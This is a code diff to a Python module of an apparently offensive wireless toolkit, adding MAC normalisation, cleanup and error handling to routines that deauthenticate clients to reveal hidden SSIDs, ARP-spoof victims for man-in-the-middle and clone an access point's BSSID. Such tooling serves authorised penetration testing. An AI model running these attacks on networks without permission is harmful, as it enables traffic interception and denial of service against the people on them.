@@ -32,6 +32,7 @@ from __future__ import annotations
 import asyncio
 import contextlib
 import re
+import shutil
 import tempfile
 from dataclasses import dataclass, field
 from pathlib import Path
@@ -56,6 +57,17 @@ _HIDDEN_MARKER = re.compile(r"^<length:\s*\d*>?$")
 # A throwaway PSK for the WPA2 downgrade twin. Not a secret: it is the AP we
 # stand up to pull transition-mode clients onto the weaker cipher.
 _DEFAULT_DOWNGRADE_PSK = "12345678"
+
+
+def _to_colon_mac(mac: str) -> str:
+    """Normalise a validated MAC/BSSID (colon, hyphen or bare hex) to colon-upper.
+
+    ``require_bssid`` accepts colon, hyphen and bare-12-hex forms, but
+    ``wireless.mac.change_mac`` (and airodump scope entries) expect colon form.
+    Canonicalising here keeps a hyphen/bare-hex BSSID from crashing change_mac.
+    """
+    hexonly = mac.replace(":", "").replace("-", "")
+    return ":".join(hexonly[i : i + 2] for i in range(0, 12, 2)).upper()
 
 
 # ───────────────────────── hidden SSID: pure helpers ─────────────────────────
@@ -188,32 +200,37 @@ class HiddenSSIDReveal:
         target = require_bssid(bssid)
         tmp = Path(tempfile.mkdtemp(prefix="netreaper_hidden_"))
         prefix = tmp / "reveal"
-        cap_task = asyncio.create_task(
-            self._capture(iface, target, channel, prefix, capture_seconds)
-        )
         try:
-            await asyncio.sleep(min(settle_seconds, max(0, capture_seconds - 1)))
-            await self._aireplay.deauth_attack(
-                iface, target, count=deauth_count
+            cap_task = asyncio.create_task(
+                self._capture(iface, target, channel, prefix, capture_seconds)
             )
-            await cap_task
-        except BaseException:
-            cap_task.cancel()
-            with contextlib.suppress(asyncio.CancelledError):
+            try:
+                await asyncio.sleep(min(settle_seconds, max(0, capture_seconds - 1)))
+                await self._aireplay.deauth_attack(
+                    iface, target, count=deauth_count
+                )
                 await cap_task
-            raise
-        csv_path = Path(f"{prefix}-01.csv")
-        if not csv_path.exists():
-            logger.warning("no capture CSV at %s; SSID not revealed", csv_path)
-            return None
-        essid = revealed_essid(
-            parse_airodump_csv(csv_path.read_text(errors="replace")), target
-        )
-        if essid:
-            logger.info("Revealed hidden SSID for %s: %s", target, essid)
-        else:
-            logger.info("SSID for %s stayed hidden", target)
-        return essid
+            except BaseException:
+                cap_task.cancel()
+                with contextlib.suppress(asyncio.CancelledError):
+                    await cap_task
+                raise
+            csv_path = Path(f"{prefix}-01.csv")
+            if not csv_path.exists():
+                logger.warning("no capture CSV at %s; SSID not revealed", csv_path)
+                return None
+            essid = revealed_essid(
+                parse_airodump_csv(csv_path.read_text(errors="replace")), target
+            )
+            if essid:
+                logger.info("Revealed hidden SSID for %s: %s", target, essid)
+            else:
+                logger.info("SSID for %s stayed hidden", target)
+            return essid
+        finally:
+            # Always remove the capture scratch dir, on success or failure, to
+            # match handshake.py's cleanup discipline (M2).
+            shutil.rmtree(tmp, ignore_errors=True)
 
     async def _capture(
         self, iface: str, bssid: str, channel: int, prefix: Path, seconds: int
@@ -464,7 +481,7 @@ class ArpSpoof:
     async def _poison(self, iface: str, victim: str, spoofed: str) -> None:
         from netreaper.core.exceptions import SubprocessError, ToolNotFoundError
 
-        with contextlib.suppress(SubprocessError, ToolNotFoundError):
+        try:
             # arpspoof runs until cancelled; cancelling the task tears the
             # process group down via the seam. None timeout = run until stopped.
             await self._run.run(
@@ -473,6 +490,14 @@ class ArpSpoof:
                 tier=Tier.MITM,
                 destructive=True,
                 timeout=None,
+            )
+        except (SubprocessError, ToolNotFoundError):
+            pass
+        except Exception:
+            # Never leave an unretrieved task exception (CancelledError is a
+            # BaseException, so cancellation still propagates and reaps the group).
+            logger.exception(
+                "arpspoof poison stream failed (%s -> %s)", victim, spoofed
             )
 
     async def stop(self) -> None:
@@ -512,10 +537,13 @@ async def clone_ap_mac(
 ) -> str:
     """Clone a legitimate AP's BSSID onto our adapter and match its channel."""
     iface = require_interface(interface)
-    bssid = require_bssid(target_bssid)
+    # require_bssid accepts colon/hyphen/bare-hex; change_mac wants colon form (M1).
+    bssid = _to_colon_mac(require_bssid(target_bssid))
     new_mac = await change_mac(iface, new_mac=bssid)
     # Matching the channel is a local op on our own interface: host action.
-    await runner(["iw", "dev", iface, "set", "channel", str(channel)])
+    result = await runner(["iw", "dev", iface, "set", "channel", str(channel)])
+    if result is None or not getattr(result, "ok", False):
+        logger.warning("channel set to %d on %s may have failed", channel, iface)
     logger.info("Cloned %s onto %s (channel %d)", bssid, iface, channel)
     return new_mac
 
